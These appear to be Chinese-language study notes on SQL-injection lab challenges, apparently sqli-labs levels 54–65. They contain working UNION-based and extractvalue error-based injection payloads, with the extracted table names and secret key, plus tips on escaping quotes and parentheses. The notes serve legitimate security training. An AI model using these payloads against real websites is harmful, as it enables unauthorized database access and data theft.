## note

1. show tables
```
select group_concat(table_name) from information_schema.tables where table_schema='数据库名字' 
```
2. des 表名
```
select group_concat(column_name) from information_schema.columns where table_name='表名' 
```
3. 数据

```
select group_concat(列名) from 数据库名字.表名
``` 

## 54

什么都没有过滤

只有10次注入的机会，去拿到 Database (CHALLENGES) 里的secret key

1. 知道数据库名，找到表名

```

?id=0' union select 1,2, group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27--+

TY7VY0TOJZ

```

2.  知道表名，获得表结构

```
 
?id=0%27union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27TY7VY0TOJZ%27--+

id,sessid,secret_B6N2,tryy

```


3. 找到数据

```

?id=0%27union%20select%201,2,group_concat(secret_B6N2)%20from%20challenges.TY7VY0TOJZ --+

5iY4tQznL3IBZ9hIMFzHqf0O

````


## 55 - 57

55 测试几次发现参数只是被括号包裹了，让括号闭合即可

56 参数被括号和单引号包裹

57 参数被双引号包裹

## 58 - 61

似乎无论如何计算都无法获得数据库数据，但是由于有错误回显，所以可以进行显错注入。

在extractvalue 中加入语句

?id=-1'union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e))--+

## 62-65 

时间盲注
 
